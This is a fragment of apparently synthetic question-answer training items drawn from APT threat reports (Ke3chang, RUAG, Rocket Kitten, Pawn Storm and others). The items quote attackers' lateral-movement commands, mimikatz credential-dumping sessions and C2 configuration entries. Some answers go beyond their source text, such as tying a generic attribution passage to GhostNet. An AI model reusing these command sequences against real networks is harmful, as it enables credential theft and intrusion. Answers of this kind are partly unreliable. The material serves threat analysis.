attempt to use real documents so that if the broker wishes to check their legitimacy, they will see that they are real.\nHowever, how difficult is it to obtain these documents? It is very complicated. The only way to do it is from companies in the sector. Oil transportation companies, for example. This was just a theory, at that time we didn't have any evidence to prove that that was the objective of those responsible for the 'Phantom Menace' attack.\nRead the text above and answer this question: What steps did the 'Phantom Menace' attack take to ensure persistence and continuous operation on the infected system?",
    "output": "The 'Phantom Menace' attack ensured persistence and continuous operation through several steps. First, it modified the Windows registry to run a batch file (aagi.bat) every time the system started. It then copied four files with the .abc extension and changed their extensions to .exe. These files were legitimate applications designed to collect credentials and run another batch file every hour. The attack also used the ATTRIB system command to hide folders, disabled the Windows firewall, and renamed credential files to include the current date and time. Finally, it used the FTP command to upload the stolen credentials to an external FTP server controlled by the attackers. Additionally, it ran another batch file (iei.bat) every hour to restore deleted files, delete uploaded credential files, restore the Windows registry key, and repeat the credential collection and upload process.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: BMW\n\u2022 mail.yahoo.sendsmtp.com\n\u2022 update.msntoole.com\nMyWeb\n\u2022 expo2010.zyns.com\n\u2022 win7.sixth.biz\n\u2022 ensun.dyndns.org\n\u2022 www.spaces.ddns.us\n\u2022 blog.strancorproduct.info5\n5 The sample was not located for this CnC; however, the callback and response captured by JsUnpack is consistent with the \"Eourdegh\" variant of the MyWeb malware, as outlined here: http://jsunpack.jeek.org/dec/go?report=e5f9dae61673a75db6dcb2475cb6ea8f22f66e9a\nWe have mapped out the relationship between the CnC servers for all three malware families and have found that they have shared common historical IP addresses in the past.\nUsing the IP addresses from the 23 CnC servers FireEye collected from our initial samples, we then mapped all the IP addresses that these domains resolved to. We then collected any other domains that also resolved to these IP addresses, resulting in at least 99 possible Ke3chang CnC servers.\nUpon further analysis, we find that these 99 CnC servers are primarily located in the U.S., China, and Hong Kong.\nMedium Headline: Information gathering / lateral movement analysis\nOnce a compromised system connects to the CnC server, the Ke3chang attackers follow a predetermined script. They first gather information about the local computer and the network to which it is connected. FireEye found the following tools on the CnC server, which the attackers used to steal logon credentials and move laterally across the network:\n\u2022 a7b20fe0bc6ae7f7a24670a732d2a021 gs.exe\ngsecdump v0.7 by [REDACTED] ([REDACTED]@truesec.se)\n\u2022 291503be3c25e52382f2a54420d03d71 gsl.exe gsecdump v0.6 by [REDACTED] ([REDACTED]@truesec.se)\n\u2022 8cdc9ffadbe4aad9418580b6ba2cc252 nete.exe\nNetE v1.0 Questions, comments, bitches and bugs to [REDACTED]@cultdeadcow.com\n\u2022 8cf6e698ecf3e167321a3ed2b9a9c62f PwDul2.exe 8cf6e698ecf3e167321a3ed2b9a9c62f PwDump62.l.exe\nUsage: PwDul2.exe [-x][-n][-h][-o output_file][-u user] [-p password][-s share] machineName\nAfter running the standard commands available in the AutoScanner, the attackers often used the \"net group\" command to acquire information about specific network groups revealed in the pre-configured commands. This step was done manually; we found several instances of typing errors, such as the following:\n\u2022 net group \"[REDACTED]\" /doamin\n\u2022 net group /doamin\nThe attackers then listed information for specific users, focusing on users and groups suspected of possessing advanced rights such as domain administrators and service accounts that have access to a wide range of systems.\nThen they used the \"net use\" command to map network drives, including some that required a password, as follows:\n\u2022 net use \\\\[REDACTED] [REDACTED]:J: /user:[REDACTED]\nIn some cases, they appeared to try and move laterally by copying a file (always initially called \"msn.tmp\") to other machines on the network. They frequently changed the destination directory and filename of the target file, presumably to make finding the malware more difficult for incident responders upon initial discovery.\n\u2022 net use \\\\172.xx.xx.x [REDACTED] /u:172.xx.xx.x\\[REDACTED]\n\u2022 dir \\\\172.xx.xx.x\\c$\n\u2022 dir \"\\\\172.xx.xx.x\\c$\\Program Files\\Adobe\"\n\u2022 copy C:\\Users\\[REDACTED]\\AppData\\Local\\Microsoft\\Windows\\msm.tmp \"\\\\172.xx.xx.x\\c$\\Program Files\\Common Files\\Adobe\\ARM\\1.0\\AdobeARM.exe\" /y\nThe attackers then deleted the network shares:\n\u2022 net use \\\\[REDACTED] /del\nAfter that, attackers gathered specific data of interest (such as the listings of all files in certain directories), and compressed it all within the RAR archive as follows:\n\u2022 %temp%/wmp32.dll a -m5 \u2013hp[REDACTED] %temp%/tem.rar %temp%\\*dir*.*\nThey then checked the RAR archive, uploaded it to the CnC server, and deleted the archive from the compromised system:\n\u2022 dir %temp%/tem.rar\n\u2022 del C:\\DOCUME~1\\[REDACTED]\\[REDACTED]\\Temp\\tem.rar\nDuring our window of visibility, FireEye found evidence that the attackers were able to enumerate the various target networks, move laterally to compromise new systems, and finally to gather information that was compressed and uploaded to the CnC server. However, FireEye lost visibility on this Ke3chang CnC server before the attackers shifted to the major data exfiltration phase.\n\nQuestion: How did the Ke3chang attackers gather information about the local computer and the network to which it was connected after compromising a system? What tools and techniques did they employ for lateral movement and credential theft?\n\nAnswer:",
    "output": "Once a compromised system connected to the CnC server, the Ke3chang attackers followed a predetermined script to gather information about the local computer and the network. They used several tools to steal logon credentials and move laterally across the network. These tools included 'gs.exe' and 'gsl.exe', which are versions of gsecdump, 'nete.exe' (NetE v1.0), and 'PwDul2.exe' (PwDump62.l.exe). The attackers ran standard commands available in the AutoScanner and manually used the 'net group' command to acquire information about specific network groups. They listed information for specific users, focusing on those with advanced rights like domain administrators and service accounts. To move laterally, they used the 'net use' command to map network drives and copied a file (initially called 'msn.tmp') to other machines on the network, changing the destination directory and filename to evade detection.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Duqu 2.0 APT actor use spear-phishing emails with malicious attachments to gain initial access to victim systems?",
    "output": "Phishing: Spearphishing Attachment is a tactic used by adversaries to gain access to victim systems by sending targeted emails with malicious attachments. In the case of the Duqu 2.0 APT actor, it is suspected that spear-phishing emails played an important role in the initial attack against Kaspersky Lab. Although the exact infection vector is unknown, the fact that one of the patient zero's mailbox and web browser history were wiped to hide traces of the attack suggests that a spear-phishing email with a malicious attachment may have been used. Furthermore, the Duqu 2.0 actor has been known to use zero-day exploits, such as CVE-2011-3402 and CVE-2014-4148, which could have been delivered via a spear-phishing email with a malicious attachment. The attachment could have been a Microsoft Office document, executable, PDF, or archived file that exploits a vulnerability or directly executes on the user's system. The email would likely have contained social engineering tactics, such as posing as a trusted source, to trick the user into opening the attachment.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Lateral movement\nBefore the attackers try to make lateral movements, they will do some basic fingerprinting of the system and the environment the infected computer is located in.\nFor the lateral movement, the attackers use various, public available tools, like:\n\u2022 mimikatz.exe for the stealing of credentials\n\u2022 pipelist.exe to list named pipes\n\u2022 psexec.exe and wmi.exe for remote execution\n\u2022 dsquery.exe and dsget.exe to query the Active Directory\n\u2022 ShareEnum.exe to enumerate shares\nApart from these tools, the attackers use many self-written batch scripts.\nThey are very patient; the lateral movement can take several months. They repeat these actions regularly in order to keep information accurate and to have always enough credentials. The harvesting of credentials is done in various ways: Apart from using sniffing tools and key loggers, the attackers rely heavily on the use of (<https://github.com/gentilkiwi/mimikatz>)Mimikatz. Mimikatz basically has the following capabilities:\n\u2022 Getting plaintext passwords, hashes, and Kerberos tickets out of the memory\n\u2022 Extracting certificates and private keys\n\u2022 Perform (<https://en.wikipedia.org/wiki/Pass_the_hash>)Pass-the-Hash and (<https://www.blackhat.com/presentations/bh-europe-09/Bouillon/BlackHat-Europe-09-Bouillon-Taming-the-Beast-Kerberous-whitepaper.pdf>)Pass-the-Ticket attacks.\nThe attackers used many of these features, until they gained control over the AD by getting the (<http://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it>)Golden (<http://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it>)Ticket (krbtgt):\n1\n.#####. mimikatz 2.0 alpha (x64) release \"Kiwi en C\" (Jun 22 2015 10:30:32)\n2\n.## ^ ##.\n3\n## / \\ ## /* * *\n4\n## \\ / ## Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n5\n'## v ##' http://blog.gentilkiwi.com/mimikatz (oe.eo)\n6 '#####' 7\nwith 16 modules * * */\n8 9 mimikatz(commandline) # privilege::debug\n10 Privilege '20' OK\n11 12 mimikatz(commandline) # token::elevate\n13\nToken Id : 0\n14\nUser name :\n15\nSID name : NT AUTHORITY\\SYSTEM\n16\n144 39822 NT AUTHORITY\\SYSTEM ...\n17 -> Impersonated ! 18\n19 [...Omitted...]\n20 21 mimikatz(commandline) # lsadump::lsa /patch\n22\nDomain\n23\nRID : User : LM : NTLM :\n24\nRID : User : LM : NTLM :\n25\nRID : User : LM : NTLM :\n26\n: / S-1-5 [...Omitted...]\n27\n000001f6 (502) krbtgt\n28\n7d9..08\nThe attackers moved laterally by infecting additional systems. They used various approaches to do so, one shown below:\n1\nnet use \\\\COMPUTERNAME\\IPC$ xxxx /user:DOMAIN\\USERNAME dir /ON \\\\COMPUTERNAME\\C$ \\\n2\ndir /ON \\\\COMPUTERNAME\\C$ \\Users\\\n3\ndir /ON \\\\COMPUTERNAME\\C$ \\PATHNAME\\\n4 dir /ON \"\\\\COMPUTERNAME\\C$ \\Users\\USERNAME\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\\"\n5 copy /Y C:\\Users\\USERNAME\\AppData\\Local\\Temp\\brainware_temp.jpg \"\\\\COMPUTERNAME\\C$\n\\Users\\USERNAME\\AppData\\Roaming\\Microsoft\\Windows\\Start\nMenu\\Programs\\StartUp\\BrainwareStart.exe\"\n6 dir /ON \"\\\\COMPUTERNAME\\C$ \\Users\\USERNAME\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\\"\n7\nnet use \\\\COMPUTERNAME\\IPC$ /delete\n8\ntasklist /v /s COMPUTERNAME /u DOMAINNAME\\USERNAME /p xxxx\n9\nnet use \\\\COMPUTERNAME\\IPC$ /delete\nHere, the attackers copied the infection binary to a new bot and executed it from there.\nThe attackers regularly updated configuration files of the infected bots in order to have always 2 working C&C server connections.\n1\nquantity = 1\n2\naddress1 = airmax2015.leadingineurope.eu:80:/wp-content/gallery/\n3\n4 [CW_INET_RESULTS]\n5 quantity = 1\n6 address1 = airmax2015.leadingineurope.eu:80:/wp-content/gallery/ 7\n8\n[CW_INET]\n9\nquantity = 1\n10\naddress1 = porkandmeadmag.com:80:/wp-includes/pomo/js/\n11\n12 [CW_INET_RESULTS]\n13\nquantity = 1\n14\naddress1 = porkandmeadmag.com:80:/wp-includes/pomo/js/\nIf a system was of no use anymore, the attackers tried to clean it by deleting the files and stopping the service:\n1\nrem sc stop srservice\n2\nsc delete srservice\n3\ndir /ON \"C:\\Program Files\\PATH\"\n4\ndel /q \"C:\\Program Files\\PATH\\msximl.dll\" del /q \"C:\\Program Files\\PATH\\ximarsh.dll\" del /q\n\"C:\\Program Files\\PATH\\miniport.dat\" del /q \"C:\\Program Files\\PATH\\vndkrmn.dic\" del /q\n\"C:\\Program Files\\PATH\\msimghlp.dll\" del /q \"C:\\windows\\system32\\srsvc.dll\"\n5\ndir /ON \"C:\\Program Files\\PATH\"\n6\nnet use IPC$ /delete\n\nDescribe the methodology employed by the attackers to move laterally within the network during the RUAG espionage case. What tools and techniques were used, and how did they ensure the accuracy of their information and maintain control over the infected systems?",
    "output": "The attackers employed a patient and systematic approach to lateral movement within the network. They utilized various publicly available tools such as mimikatz.exe for credential theft, pipelist.exe to list named pipes, psexec.exe and wmi.exe for remote execution, dsquery.exe and dsget.exe to query the Active Directory, and ShareEnum.exe to enumerate shares. Additionally, they wrote custom batch scripts to automate certain tasks. The attackers repeated these actions regularly to keep information accurate and maintain a sufficient pool of credentials. They also used tools like net use and tasklist to infect additional systems and execute binaries remotely. To ensure continuous control, they regularly updated configuration files of the infected bots to maintain at least two working Command & Control (C&C) server connections.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: INTRODUCTION\nOperation Pawn Storm refers to economic and political espionage attacks instigated by a group of threat actors primarily targeting military, embassy, and defense contractor personnel from the United States and its allies. Opposing factions to and dissidents of the Russian government, international media, and even the national security department of a U.S. ally were also targeted. The threat actors used three attack vectors\u2015 spear-phishing emails with malicious attachments, an advanced network of phishing websites, and exploits injected into legitimate conference and media websites. They used a nonmalicious JavaScript to victimize Microsoft\u2122 Outlook\u00ae Web Access (OWA) users from carefully selected target organizations. The OWA phishing attacks proved extremely effective and could be\nparticularly dangerous to any organization that allows employees to use OWA.\nAn in-depth look at six multistage attacks revealed one thing in common\u2015the use of SEDNIT/Sofacy malware [1], [2]. The use of such multistage downloaders provided attackers additional protection against detection. We believe the threat actors aimed to confuse their targets' IT administrators by making it hard for them to string attack components together, thus evading detection.\nThis research paper details when certain attacks occurred, what tools were used in attempts to get in to target networks, and target profiles to form a general picture of Operation Pawn Storm.\nAnswer this question: Why did the threat actors behind Operation Pawn Storm use multiple attack vectors, including spear-phishing emails, phishing websites, and exploits injected into legitimate websites? How did this strategy enhance their ability to evade detection and compromise their targets?",
    "output": "The threat actors behind Operation Pawn Storm employed multiple attack vectors, such as spear-phishing emails with malicious attachments, an advanced network of phishing websites, and exploits injected into legitimate conference and media websites, to diversify their methods of infiltration. This approach enhanced their ability to evade detection and compromise their targets by increasing the likelihood that at least one method would succeed. Additionally, they used a nonmalicious JavaScript to target Microsoft\u2122 Outlook\u00ae Web Access (OWA) users from carefully selected organizations, which proved particularly effective. By using various techniques, the attackers made it more difficult for IT administrators to identify and correlate different components of the attacks, thereby providing additional protection against detection.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Study of an APT attack on a telecommunications company in Kazakhstan\n\u00a9 Doctor Web, Ltd., 2022. All rights reserved.\nThis document is the property of Doctor Web, Ltd. (hereinafter - Doctor Web). No part of this document may be reproduced, published or transmitted in any form or by any means for any purpose without proper attribution.\nDoctor Web develops and distributes Dr.Web information security solutions which provide efficient protection from malicious software and spam.\nDoctor Web customers can be found among home users from all over the world and in government enterprises, small companies and nationwide corporations.\nDr.Web antivirus solutions are well known since 1992 for continuing excellence in malware detection and compliance with international information security standards. State certificates and awards received by the Dr.Web solutions, as well as the globally widespread use of our products are the best evidence of exceptional trust to the company products.\nStudy of an APT attack on a telecommunications company in Kazakhstan 3/23/2022\nDoctor Web Head Office\n2-12A, 3rd str. Yamskogo polya\nMoscow, Russia\n125040\nWebsite: www.drweb.com\nPhone: +7 (495) 789-45-87\nRefer to the official website for regional and international office information.\nBig Headline: Remote Rover\nCommand and control server for BackDoor.Whitebird.30 calls Remote Rover. It allows hackers to remotely launch applications, update the backdoor configuration, download and upload files. Besides that, you can use a command shell via Remote Rover. This is what the control server interface looks like:\nRemote Rover came with a configuration file CFG\\default.ini with the following content:\nIf you translate the content from Chinese into English, you can get this path:\nFor a detailed description of the malware used and how it works, see the Dr.Web Virus Library.\n\u00b7 BackDoor.Siggen2.3622\n\u00b7 BackDoor.PlugX.93\n\u00b7 BackDoor.Whitebird.30\n\u00b7 Trojan.Loader.891\n\u00b7 Trojan.Loader.896\n\u00b7 Trojan.Uacbypass.21\n\u00b7 Trojan.DownLoader43.44599\n\nHow does the Remote Rover command and control server facilitate the operations of the Calypso APT hacker group, particularly in the context of managing the BackDoor.Whitebird.30 malware?",
    "output": "A: The Remote Rover command and control server for BackDoor.Whitebird.30 provides the Calypso APT hacker group with several functionalities to manage their operations remotely. These functionalities include the ability to remotely launch applications, update the backdoor configuration, download and upload files, and use a command shell. This comprehensive set of features allows the hackers to maintain persistent access and control over the compromised systems, enabling them to execute various commands and manipulate the environment as needed. The configuration file 'CFG\\\\default.ini' associated with Remote Rover further supports these capabilities by specifying paths and settings necessary for its operation.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: WOOLGERED\u2014HOISTED BY THEIR OWN PETARD\nUsing credentials hard-coded into the woolen key-logger, we were able to retrieve numerous woolger DAT files (key-logs), as uploaded from victims around the world.\nAs apparent, the same hard-coded FTP credentials were, in fact, Administrator credentials on the C&C Windows server itself, which had the C$ and D$ NetBIOS/SMB administrative shares openly accessible from the WAN.\nImage 20\u2014if you didn't want to allow researchers to have administrator access to your C&C server <captain_hindsight.png> you shouldn't have hard-coded administrator credentials into your malware.\nAmong many logged keystroke files containing stolen data, we stumbled on an astonishing discovery: the Rocket Kitten attackers had, in fact, infected their own workstations, apparently as 'test-runs' for woolger. The attackers failed to remove these files from the C&C server, demonstrating, yet again, utter lack of OPSEC.\nOf peculiar interest to us were logs made by none other than 'Wool3n.H4t' himself:\nImage 21\u2014The test worked.\nWould you be surprised what followed in the same log file?\nImage 22\u2014The attacker testing his own tool.\nYes, we actually just witnessed Wool3n.H4T switching through his open windows, including a Microsoft Visual Studio live debugging session of a project called\u2026 'CWoolger'\nIn another log, we observe the specific programming of loading of the 'wsc.vbs' script, as observed in the Trend Micro publication and others. At this point, there should be no question\u2014we are looking at the malware author's development workstation.\nImage 23\u2014Mutexes and thread-safety should be the least of your worries.\nThe next log shows us the attacker wanted to test whether his tool would accurately capture credentials entered into a Firefox HTTP authentication prompt, and thus he entered his own C&C server\u2026\nImage 24\nAll of Wool3n.H4T's retrieved logs were dated October 2014.\nThen, we spotted this log segment:\nImage 25 \u2013'AOL Mail' already narrowed it\nRecorded under the Wool3n.H4T name, a user logs into AOL mail with username 'yaserbalaghi.'\nCould it be the same 'Yaser' as noted in the recent Trend Micro and ClearSky paper? ('D:\\Yaser Logers\\CWoolger'\u2026) Could it explain the Phakeddb reference to \"ybsoft\"? We don't know at this point; we have to go deeper.\n'yaserbalaghi@aol.com' appears to give a technical answer in a long C++ thread in an Iranian programmers forum (\"Barname Nevis\") in Iranian 'Solar Hijri' calendar year 1389 (2010-2011):\nThe same yaserbalaghi user made several posts, also linking to various programming instructional videos in the subjects of ASP.NET and AJAX, jQuery and SQL injections as instructed by him using screen capture software.\nCareful watching of the videos allowed us to learn a few interesting details. For starters, Yaser Balaghi is a Microsoft Visual Studio 2010 user, with familiarity of several tools observed to be used during the 'Rocket Kitten' campaign.\nImage 26\u2014Screenshot taken from instructional video by Yaser Balaghi (Engineer Balaghi)\nFurther inspecting the user names and host names evident in the screen captures, we noticed we were actually in possession of logged keystrokes from an \"infected computer\" where the user name was \"Engineer Balaghi,\" strengthening our suspicions. However, we can't be sure yet; Yaser Balaghi may be a common name or perhaps this is someone related to Wool3n.H4T or the attackers.\nA few minutes later, and we spotted this gem of an OPSEC mistake in the SQLi instructional video, which precisely provided the smoking gun we were after:\nImage 28\u2014Watching an hour of Farsi SQL injection tutorial has its rewards\nWool3n.H4t is caught red-handed. One of his many mistakes, he was now caught giving a public tutorial while logged in under his secret alias, otherwise unlinked with his real identity. These videos were recorded February 2014, prior to the first clear Rocket Kitten attack wave mid-year.\nA quick glance on W00l3n.Hat's desktop reveals a striking match with web hacking attack tools previously described in Rocket Kitten's arsenal.\nImage 29\u2014Havij, Acunetix, Netsparker, SQLMap, wamp, and oh\u2014is that IDA properly licensed?\nA few online queries later, we are getting numerous results, cross-referenced to verify as the same Yaser Balaghi, now the main suspect to hold the Wool3n.H4T identity.\nEngineer Yaser Balaghi is not only an active member of various programming forums\u2014he had a web site (www.eng-balaghi.com, gone offline since August 2014, still available in the Wayback Machine). In the available archived version of the site he described himself as a \"programmer, analyst, consultant and lecturer,\" and made himself available for hire.\nImage 30\u2014Yaser Balaghi's stackoverflow account\nIf all that wasn't enough, we also managed to retrieve an updated resume for Tehran-based Engineer Balaghi:\nImage 31 \u2013 Yaser Balaghi's Resume (2013)\nIslamic Azad University Computer Software Graduate Balaghi lists his job experience, including \"Technical Director and Team Leader of Software Development Team (Private)\" (highlighted in original), as well as \"Head of Security and Hacking (legal and ethical) (Private)\". Later, he goes as far as listing sample accomplishments and completed projects, including the development and system design for a \"Phishing Attacks System\" ordered by \"a cyber-organization\".\nWe could go on, but the main lesson of this section can be: if you don't want people to know you created malware for the government, don't list it in your CV.\nBig Headline: REELED IN\u2014PHISHING LOGS ANALYSIS\nAs reported so far, the attackers persistently e-mailed, called and responded with fake identities, tailored for each victim. The attackers clearly read the public reports about them, respond and adapt their tactics, occasionally showing a creative mindset.\nIn one reported case, the attacked posed under the true identity of a ClearSky researcher, referencing the recent Rocket Kitten report, attaching \"detection software\" that does exactly the opposite. This an interesting tactic, worthy of mentioning in social engineering classes.  It would be wise at this point to mention that the release of report does not include any accompanying detection or protection tools other than the existing Check Point software blades. If you received this report with an attached executable, it is likely a malicious lure.\nIn another case, the attackers sent a malicious attachment using the identity of a previously known targeted victim. The Israeli recipient of that attachment was wary enough to suspect the origin of the e-mail and responded with a query: \"Is that you or are the Iranians in your computer again?\" To which the attackers responded (in perfect non-Google-Translate Hebrew): \"The Iranians will never return to my computer!\"\nThat very well may have been the talk of the day at the Tehran operations center, possibly featured in an email printout in the main dining room.\nAs the Rocket Kitten group's behavior was well characterized in previous publications (see the recent report from Trend Micro and ClearSky). We will focus on new insights based on our analysis of the 'Oyun' system victim database. We understand that this database contains a partial view, starting August 2014 to August 2015. While the data can be successfully correlated with logs collected from other servers, we have no visibility of e-mails with malicious attachments (as opposed to phishing links to steal credentials), or any complete web hacking log for attacker activity.\nThe sheer volume of the target database suggests an extensive operation, the work of a group of people over months. The logs included the visiting IP address geo-located country. Our analysis shows the following distribution:\nChart 1\u2014Phishing visitors' country distribution\nWe have studied the visitor data to determine this includes many attacker accesses to test the site functionality. We know the attackers used addresses from Iran, as well as VPN access from the US, Germany, Saudi Arabia and the Netherlands. The data must be interpreted taking these facts into consideration.\nOur primary filtering dismissed around 25% of logs and 15% of projects as 'test runs' for the system. The following is based on the remaining seemingly valid entries.\nCharting the phishing logs over time, we can observe the following timeline:\nChart 2\u2014Phishing logs and successes over time\nWe can study this data to make a few interesting observations:\n\u2022 On average, all phishing pages on this server had 26% success in fooling victims to enter their credentials. These are surprisingly high results, potentially attributed to persistency and well-targeted e-mails.\n\u2022 On May 26, 2015, there is a unique peak of access to the site, with minimal successes. When analyzed, these accesses appear mostly in 3 batches over periods of minutes, with incremental 'project_ids' and no data provided, from Israeli IP addresses. We can safely discard these as researcher probes, attempting to 'brute-force' phishing pages, immediately preceding the ClearSky June publication.\n\u2022 The attackers seem to have shut down their platform on June and July (likely due to the publication) and resumed operations during August. We found evidence to suggest the database had been migrated from a previous server.\nSlicing the projects table by user_id allows a unique internal look on operator assignment; while our target analysis is far from conclusive, we can share a reserved primary assessment of what each user was tasked with:\nDespite our limited visibility, we can confirm many of these attacks were successful\u2014the attackers gained confidential information from various targets all around the world.\nRead the text above and answer this question: How did the investigators gain access to the Rocket Kitten attackers' C&C server, and what critical mistake did the attackers make that facilitated this access?",
    "output": "The investigators gained access to the Rocket Kitten attackers' C&C server by using credentials hard-coded into the woolen key-logger. The attackers made a critical mistake by hard-coding administrator credentials into their malware, which allowed researchers to access the C&C server's administrative shares openly from the WAN.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Applying the evidence-based approach to cyber attacks: the challenge of attribution\nDetermining those responsible for cyber attacks, commonly known as the attribution problem, is a major challenge. The Internet was never built with security as a priority. The current version of the Internet's address assignment system, IP V4, provides a wealth of loopholes and methods by which a perpetrator can mask his or her real identity and location. Online identities and servers can be cleverly hidden. Packet flows and connections can be masked and redirected through multiple servers. A clever attacker can often hijack a machine belonging to an otherwise innocent organization and use it as a base for launching attacks.\nHand-in-hand with the problem of attribution is the difficulty of identifying motivating factors behind a cyber attack. Many perpetrators of Internet-based attacks and exploits are individuals whose motivation can vary from a simple profit motive through to fear of prosecution or strong emotional feelings, including religious belief and nationalism. Many cyber attacks and exploits which seem to benefit states may be the work of third-party actors operating under a variety of motivations. This makes it difficult to separate the motivation of the individual from the potential motives of the party on whose behalf the attacks have occurred, or a prospective client to which the perpetrator is trying to market his or her wares. In either case, the challenge of identifying perpetrators and understanding their motives gives state actors convenient plausible deniability and the ability to officially distance themselves from attacks.\nCyber campaigns can also take on a life of their own. Even though a state might 'seed' a particular campaign through tacit encouragement or the absence of sanctions or prosecutions, these campaigns are inherently chaotic and unpredictable in scope and outcome.20 Phenomena such as spontaneous 'cyber rioting' can surpass the initial purposes of the cyber campaign. Low barriers to entry to this sort of activity enable anyone with a computer and Internet connection to take part in a cyberattack.21 For the most part, governments appear to passively benefit from online manifestations of nationalistic and patriotic fervour, although outcomes are inherently unpredictable.22\nIn China, the authorities most likely perceive individual attackers and their online activities as convenient instruments of national power.23 A favourite target of Chinese hackers is Taiwanese computer systems, especially during times of Sino-Taiwanese tensions, such as elections and\nreferendums.24 In April 2001, following the death of a Chinese fighter pilot after a collision with an American spy plane near the Chinese island of Hainan, Chinese hackers began a sustained campaign to target American computer networks. No link was made with elements of the Chinese government.25\n20 http://www.yorku.ca/robarts/projects/canada-watch/obama/pdfs/Deibert.pdf\n21 http://worldanalysis.net/modules/news/article.php?storyid=343\n22 For instance, during the Russia-Georgia conflict in August 2008, tools were made available online for those who wished to participate in the ongoing 'cyber-war' against Georgian websites. http://blog.wired.com/defense/2008/10/government-and.html ; http://www.slate.com/id/2197514\n23 http://findarticles.com/p/articles/mi_m0PBZ/is_6_88/ai_n31140190 ; http://fmso.leavenworth.army.mil/documents/Beijings-rising-hackers.pdf\nHowever, governments cannot always preserve direct control over such activities; groups can maintain their freelance and autonomous status and undertake their own cyber initiatives that may not always attain official sanction or serve state interests.26\nBig Headline: Targeting Tibet\nAccusations of Chinese cyber war being waged against the Tibetan community have been commonplace for the past several years. The Chinese government has been accused of orchestrating and encouraging such activity as part of a wider strategy to crack down on dissident groups and subversive activity.27 Earlier research has traced these attacks against Tibetan groups to IP addresses registered in the People's Republic of China. The attacks used malware hidden in legitimate-looking email messages, infecting unsuspecting users' computers and exploiting the data on it by sending it to control servers.28\nThe identity of the attackers has never been attributed in a conclusive manner to any specific group or individual.29 The motivation of those behind the attacks, despite conjecture, is also unproven.\nIn earlier studies, researchers focused on attacks specifically targeting the Tibetan community. But a wide variety of other victims of computer penetrations have reported infections similar to those used against Tibetan organizations, following a similar modus operandi and also reporting to control servers usually located in China. These additional targets include the Falun Gong30, the U.S. Government, and multinational corporations.31 While reports of these targeted attacks have circulated, the extent to which attackers successfully exploited the affected computers is unknown.\n24 http://fmso.leavenworth.army.mil/documents/Beijings-rising-hackers.pdf\n25 http://news.bbc.co.uk/2/hi/americas/1305755.stm\n26 http://fmso.leavenworth.army.mil/documents/Beijings-rising-hackers.pdf\n27 http://www.washingtonpost.com/wp-dyn/content/article/2008/03/21/AR2008032102605.html\n28 See, http://isc.sans.org/diary.html?storyid=4177 ; http://isc.sans.org/diary.html?storyid=4176 and http://archive.cert.uni-stuttgart. de/isn/2002/09/msg00086.html for background information on these attacks.\n29 Attribution for previous penetrations of Tibetan groups has never been publicly attributed and is not available from open sources. Classified studies may reveal a finer grained detail, as many of the attacks are relatively unsophisticated, and given proper assets, could be traced back to specific locations and presumably individuals.\n30 Research by Maarten Van Horenbeeck shows that similar attacks have targeted the Falun Gong. http://www.daemon.be/ maarten/Crouching_Powerpoint_Hidden_Trojan_24C3.pdf and http://isc.sans.org/presentations/SANSFIRE2008-Is_Troy_Burning_ Vanhorenbeeck.pdf\n31 See http://www.businessweek.com/print/magazine/content/08_16/b4080032218430.htm\n\nAnswer this question based on the above context: How does the GhostNet APT leverage the attribution problem to conduct cyber attacks, and what are the primary challenges in identifying the perpetrators and their motivations?",
    "output": "The GhostNet APT leverages the attribution problem by exploiting the inherent insecurity of the Internet's address assignment system, IP V4, which allows perpetrators to mask their real identities and locations. Attackers can hide online identities and servers, mask packet flows, and hijack innocent machines to launch attacks. The primary challenges in identifying perpetrators include the difficulty in tracing the origin of attacks due to these masking techniques. Additionally, understanding the motivations behind cyber attacks is complex because perpetrators can range from individuals driven by profit, fear of prosecution, or strong emotional feelings, to third-party actors with various motivations. This complexity makes it hard to distinguish between the motives of individuals and those of state actors, providing state actors with plausible deniability.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Threat Actor Profile\nThe attackers behind Operation Cobalt Kitty were extremely persistent. Even when their campaign was exposed, the attackers did not give up. They took \"pauses\" that lasted between 48 hours and four weeks and used the downtime to learn from their \"mistakes\" and develop workarounds before resuming the APT campaign.\nThe members of the OceanLotus Group demonstrated a remarkable ability to quickly adapt, introduce new tools and fine tune existing ones to bypass security solutions and avoid detection. The high number of payloads and the elaborate C2 infrastructure used in this attack can be indicative of the resources that the attackers had at their disposal. Simultaneously orchestrating multiple APT campaigns of such magnitude and sophistication takes time, financial resources and a large team who can support it.\nMedium Headline: Threat actor's main characteristics\nHere are the main characteristics that can help profile the threat actor:\n\u25cf Motivation - Based on the nature of the attack, the proprietary information that the attackers were after and the high-profile personnel who were targeted, Cybereason concluded the main motivation behind the attack was cyber espionage. The attacker sought after specific documents and type of information. This is consistent with about the group's activity show that the group has a very wide range of targets, spanning from government agencies, media, business sector, and more.\n\u25cf Operational working hours - Most of the malicious activity was mostly done around normal business hours (8AM-8PM). Very little active hacking activity was detected during weekends. The attackers showed a slight tendency to carry out hacking operations towards the afternoon and evening time. These observations can suggest the following:\n\u25cb Time zone(s) proximity.\n\u25cb An institutionalized threat actor (possibly nation-state)\n\u25cf Outlook backdoor and data exfiltration - One of the most interesting tools introduced by the attackers was the Outlook backdoor, which used Outlook as a C2 channel. This backdoor has not been publicly documented and is one of the most unique TTPs with regards to the threat actor. Outlook backdoors are not a new concept and have been observed in different APTs . However, this specific type of Outlook backdoor is can be considered as one of the \"signature tools\" of the OceanLotus Group.\n\u25cf Publicly available tools - The attackers showed a clear preference to use publicly available hacking tools and frameworks. Beyond being spared the 